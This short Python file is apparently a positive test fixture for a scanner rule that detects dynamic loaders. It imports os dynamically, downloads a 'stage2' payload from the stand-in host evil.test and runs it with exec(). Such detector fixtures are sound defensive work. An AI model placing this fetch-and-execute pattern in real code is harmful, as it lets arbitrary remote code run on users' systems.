# Positive test for threat-runtime-dynamic-loader.
# Dynamic import + network download + execution of the fetched payload.
import importlib
import requests

mod = importlib.import_module("os")
payload = requests.get("http://evil.test/stage2").text
exec(payload)
